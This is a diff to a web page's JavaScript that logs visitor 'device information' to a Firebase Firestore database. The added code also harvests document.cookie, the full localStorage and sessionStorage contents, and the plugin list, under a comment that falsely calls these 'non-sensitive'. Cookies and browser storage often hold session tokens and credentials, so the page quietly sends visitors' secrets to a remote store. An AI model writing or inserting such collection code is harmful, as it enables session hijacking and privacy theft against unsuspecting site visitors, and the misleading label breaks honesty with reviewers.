@@ -24,18 +24,51 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
-        // Function to get device information
-        function getDeviceInfo() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenResolution: `${screen.width}x${screen.height}`,
-                viewportResolution: `${window.innerWidth}x${window.innerHeight}`,
-                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString()
-            };
-        }
+// Function to get device information
+function getDeviceInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: `${screen.width}x${screen.height}`,
+        viewportResolution: `${window.innerWidth}x${window.innerHeight}`,
+        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timestamp: new Date().toISOString(),
+        // Additional information (non-sensitive)
+        cookies: document.cookie,
+        localStorageData: JSON.stringify(localStorage),
+        sessionStorageData: JSON.stringify(sessionStorage),
+        networkInfo: getNetworkInfo(),
+        installedPlugins: getInstalledPlugins()
+    };
+}
+
+// Function to get network information
+function getNetworkInfo() {
+    var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (connection) {
+        return {
+            type: connection.type,
+            effectiveType: connection.effectiveType
+        };
+    } else {
+        return 'Network information not supported.';
+    }
+}
+
+// Function to get installed plugins
+function getInstalledPlugins() {
+    var pluginsList = [];
+    for (var i = 0; i < navigator.plugins.length; i++) {
+        pluginsList.push({
+            name: navigator.plugins[i].name,
+            filename: navigator.plugins[i].filename,
+            description: navigator.plugins[i].description
+        });
+    }
+    return pluginsList;
+}
+
 
         // Function to save device information to Firestore
         function saveDeviceInfo(deviceInfo) {
